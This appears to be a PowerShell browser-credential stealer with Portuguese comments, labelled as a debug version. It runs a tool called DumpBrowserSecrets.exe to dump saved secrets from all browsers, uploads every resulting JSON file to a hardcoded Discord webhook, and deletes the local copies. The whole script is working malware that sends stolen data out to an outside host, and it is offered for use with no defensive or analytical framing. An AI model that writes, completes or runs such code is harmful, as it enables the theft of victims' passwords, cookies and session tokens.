# send_browser_data_debug.ps1
# Execute como Administrador

$LogFile = "$env:TEMP\browser_stealer_log.txt"
function Write-Log {
    param([string]$Message)
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    $line = "[$timestamp] $Message"
    Write-Host $line -ForegroundColor Cyan
    Add-Content -Path $LogFile -Value $line
}

Write-Log "=== INÍCIO DO SCRIPT ==="

$WebhookUrl = "https://discord.com/api/webhooks/1527718727204999299/nVc21-8bK1MfgI1Ybw5hZYG3KU0xuEZZalMATPdxY-jJFizPZn_sZiObl0UEUaGRRMdA"
$InstallFolder = "C:\ProgramData\DumpBrowserSecrets"
$DumpExe = "$InstallFolder\DumpBrowserSecrets.exe"
$OutputFolder = "$env:TEMP\DumpOutput"

# Cria a pasta de saída
if (Test-Path $OutputFolder) { Remove-Item -Path $OutputFolder -Recurse -Force }
New-Item -ItemType Directory -Path $OutputFolder -Force | Out-Null

# Verifica se o .exe existe
if (-not (Test-Path $DumpExe)) {
    Write-Log "ERRO: DumpBrowserSecrets.exe não encontrado em: $DumpExe"
    Read-Host "Pressione Enter para sair"
    exit 1
}

Write-Log "Executando DumpBrowserSecrets (janela visível para debug)..."
Write-Log "Comando: $DumpExe /b:all /e:all"

# Executa SEM ocultar (para ver o que acontece)
$process = Start-Process -FilePath $DumpExe -WorkingDirectory $OutputFolder -ArgumentList "/b:all /e:all" -Wait -PassThru -NoNewWindow

Write-Log "Processo finalizado. ExitCode: $($process.ExitCode)"

if ($process.ExitCode -ne 0) {
    Write-Log "ERRO: ExitCode $($process.ExitCode)"
    Write-Log "Pressione qualquer tecla para continuar..."
    Read-Host
    exit 1
}

# Lista os arquivos gerados
$jsonFiles = Get-ChildItem -Path $OutputFolder -Filter "*.json" -File
Write-Log "Arquivos JSON gerados: $($jsonFiles.Count)"

if ($jsonFiles.Count -eq 0) {
    Write-Log "Nenhum JSON encontrado. Verifique a pasta: $OutputFolder"
    Read-Host "Pressione Enter para sair"
    exit 1
}

foreach ($file in $jsonFiles) {
    Write-Log "Enviando: $($file.Name) ($([math]::Round($file.Length/1KB,2)) KB)"
    
    $fileBytes = [System.IO.File]::ReadAllBytes($file.FullName)
    $fileName = $file.Name
    $boundary = "---------------------------$([System.DateTime]::Now.Ticks.ToString('x'))"
    $bodyLines = @()
    $bodyLines += "--$boundary"
    $bodyLines += "Content-Disposition: form-data; name=`"file`"; filename=`"$fileName`""
    $bodyLines += "Content-Type: application/json"
    $bodyLines += ""
    $bodyLines += [System.Text.Encoding]::UTF8.GetString($fileBytes)
    $bodyLines += "--$boundary--"
    $body = [string]::Join("`r`n", $bodyLines)
    $headers = @{ "Content-Type" = "multipart/form-data; boundary=$boundary" }
    
    try {
        Invoke-RestMethod -Uri $WebhookUrl -Method Post -Headers $headers -Body $body -ErrorAction Stop
        Write-Log "Arquivo $($file.Name) enviado com sucesso!"
    } catch {
        Write-Log "ERRO ao enviar $($file.Name): $_"
    }
}

Remove-Item -Path $OutputFolder -Recurse -Force -ErrorAction SilentlyContinue
Write-Log "=== FIM DO SCRIPT ==="
Read-Host "Pressione Enter para sair"
